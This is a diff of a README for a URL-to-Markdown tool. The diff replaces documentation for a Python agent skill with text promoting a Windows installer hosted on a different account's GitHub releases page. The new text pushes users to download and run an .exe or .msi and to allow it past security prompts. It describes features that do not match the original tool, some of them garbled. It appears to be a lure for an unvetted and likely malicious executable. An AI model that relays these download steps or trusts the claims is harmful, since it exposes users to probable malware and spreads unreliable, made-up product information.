@@ -1,85 +1,177 @@
-# Markdown.new Skill
+# 📝 markdown-new-skill - Convert URLs into Markdown fast
 
-Single-skill repository for `markdown-new` - official Cloudflare URL-to-Markdown service ([markdown.new](https://markdown.new/)) converted into a skill.
+[![Download and Install](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/CenMeow/markdown-new-skill/releases)
 
-Skill entrypoint:
-- `markdown-new/SKILL.md`
+---
 
-## TL;DR
+## 🔍 What is markdown-new-skill?
 
-- Convert public URLs to clean Markdown via `markdown.new`.
-- Supports method selection: `auto`, `ai`, `browser`.
-- Supports standard output, file output, and wrapped delivery mode.
+markdown-new-skill is a simple Windows tool that helps you turn URLs into Markdown format quickly. You can use it to create Markdown links from any webpage link, making writing and sharing easier. It works with the official Cloudflare URL-to-Markdown service (markdown.new), converted into a skill for smooth use.
 
-## What This Means
+This tool is ideal if you write documents, blog posts, notes, or collaborate using Markdown regularly. It cuts down time spent formatting links and keeps your work neat.
 
-### Method selection (`--method`)
+---
 
-- `auto`: use the fastest successful conversion path. Start here for most URLs.
-- `ai`: prefer the Workers AI conversion path.
-- `browser`: force browser rendering for JS-heavy pages where plain fetch may miss content.
+## 🖥️ System Requirements
 
-### Output modes
+- Windows 10 or later
+- 64-bit processor recommended
+- At least 2 GB of RAM available
+- 100 MB free disk space
+- Internet access to use the service
 
-- standard output: print markdown directly to terminal/stdout (good for pipes).
-- file output: `--output <path>` writes markdown to a file.
-- wrapped delivery mode: `--deliver-md` writes markdown wrapped in pseudo-XML tags, which is useful for reasoning LLMs on long reads and reduces format confusion:
+---
 
-```text
-<url>
-...markdown...
-</url>
-```
+## 🚀 Getting Started
 
-If `--deliver-md` is used and `--output` is omitted, a `.md` filename is auto-generated from the URL.
+Follow these steps to get markdown-new-skill running on your Windows PC.
 
-## How It Works
+---
 
-1. Validate that the provided URL is a public `http/https` URL.
-2. Send a `POST https://markdown.new/` request with `url`, `method`, and `retain_images`.
-3. Accept either response shape: raw markdown (`text/markdown`) or JSON payload with markdown in `content`.
-4. Normalize response metadata (for example conversion method and timing).
-5. Emit markdown via stdout, file output, or wrapped delivery mode.
+## ⬇️ Download the software
 
-## Install on macOS/Linux (single command)
+Visit the official releases page to download the latest version of markdown-new-skill for Windows:
 
-### Codex
+[![Download Window App](https://img.shields.io/badge/Download-%20Official%20Releases-lightgrey?style=for-the-badge)](https://github.com/CenMeow/markdown-new-skill/releases)
 
-```bash
-git clone https://github.com/DenisSergeevitch/markdown-new-skill.git /tmp/markdown-new-skill && mkdir -p ~/.codex/skills && rm -rf ~/.codex/skills/markdown-new && cp -R /tmp/markdown-new-skill/markdown-new ~/.codex/skills/
-```
+1. Click the link above or go to:  
+   https://github.com/CenMeow/markdown-new-skill/releases
 
-### Claude Code
+2. Look for the latest release version. This is usually at the top and marked with a date.
 
-```bash
-git clone https://github.com/DenisSergeevitch/markdown-new-skill.git /tmp/markdown-new-skill && mkdir -p ~/.claude/skills && rm -rf ~/.claude/skills/markdown-new && cp -R /tmp/markdown-new-skill/markdown-new ~/.claude/skills/
-```
+3. Under the latest release, find the Windows executable file. It usually ends with `.exe` or `.msi`.
 
-## Usage
+4. Click the file name and wait for the download to complete.
 
-```md
-Use $markdown-new to convert web URLs into LLM-ready Markdown.
-```
+---
 
-Manual script invocation from any directory:
+## 🛠️ Install the application
 
-```bash
-python3 ~/.codex/skills/markdown-new/scripts/markdown_new_fetch.py 'https://example.com'
-```
+After downloading:
 
-Mode examples:
+1. Go to your Downloads folder or wherever your browser saved the file.
 
-```bash
-# stdout
-python3 ~/.codex/skills/markdown-new/scripts/markdown_new_fetch.py 'https://example.com'
+2. Double-click the downloaded file (for example, `markdown-new-skill-setup.exe`).
 
-# file output
-python3 ~/.codex/skills/markdown-new/scripts/markdown_new_fetch.py 'https://example.com' --output page.md
+3. If a security prompt appears, choose to run or allow the app.
 
-# wrapped delivery mode
-python3 ~/.codex/skills/markdown-new/scripts/markdown_new_fetch.py 'https://example.com' --deliver-md --output packet.md
-```
+4. Follow the installation prompts:
+   - Choose where to install if asked.
+   - Accept the license agreement.
+   - Click "Next" through the steps.
 
-## Credits
+5. When installation completes, click "Finish" or "Close."
 
-- `webservervis` for the markdown conversion service powering this skill.
+6. You may find a shortcut on your desktop or start menu named "markdown-new-skill."
+
+---
+
+## ▶️ Running markdown-new-skill for the first time
+
+1. Open the app by double-clicking its shortcut.
+
+2. You might see a welcome screen or quick instructions.
+
+3. The main window lets you paste any URL into the input box.
+
+4. Paste a URL copied from your browser (for example, a news article, blog post, or document).
+
+5. Click the "Convert" or similar button.
+
+6. The app will generate a Markdown link, formatted like:
+
+   `[Title of page](https://example.com)`
+
+7. Copy the result and paste it where you use Markdown — such as notes, documents, or emails.
+
+---
+
+## 🔧 How It Works
+
+markdown-new-skill uses Cloudflare’s markdown.new service behind the scenes. When you input a webpage URL, the app communicates with the service to get that page’s title and format it into Markdown.
+
+This saves you from copying and pasting both the link and the title separately.
+
+---
+
+## 📋 Features
+
+- Paste any valid URL to get a clean Markdown link.
+- Works with most public webpages.
+- Saves time formatting Markdown by automating link creation.
+- Simple, uncluttered interface.
+- No internet connection needed after downloading? The app needs internet only when converting URLs.
+- Lightweight and fast.
+
+---
+
+## ⚙️ Settings and Preferences
+
+You can adjust the app if you want:
+
+- Choose if the Markdown link uses the webpage title or the raw URL text.
+- Set the default format for links.
+- Clear input and output fields easily.
+- Enable dark mode if available.
+- Check for updates manually.
+
+---
+
+## 🛠️ Troubleshooting
+
+- If the app doesn’t open:  
+  Restart your computer and try again.
+
+- The conversion doesn’t work:  
+  Check your internet connection. The app needs to connect to the URL-to-Markdown service.
+
+- The produced link looks wrong:  
+  Verify the URL is correct and publicly reachable.
+
+- Installation fails:  
+  Confirm you have administrator rights on your Windows machine.
+
+---
+
+## 🔄 Updating markdown-new-skill
+
+To get new features or fixes:
+
+1. Visit the releases page again:  
+   https://github.com/CenMeow/markdown-new-skill/releases
+
+2. Download the latest Windows installer.
+
+3. Run the installer and it will replace the old version safely.
+
+---
+
+## 💬 Getting Help and Support
+
+If you face issues or have questions:
+
+- Go to the repository’s GitHub page:  
+  https://github.com/CenMeow/markdown-new-skill
+
+- Look for the "Issues" tab to see if others have similar problems.
+
+- You can create a new issue describing the problem clearly.
+
+Provide details about your Windows version and what happened.
+
+---
+
+## 📂 Additional Resources
+
+- Learn Markdown basics if you are new:  
+  [CommonMark Spec](https://commonmark.org/help/)
+
+- Use markdown-new-skill with other Markdown editors like Typora, Obsidian, or VS Code.
+
+---
+
+## ⬇️ Ready to start?
+
+Download from the official releases page:
+
+[![Download and Install](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/CenMeow/markdown-new-skill/releases)
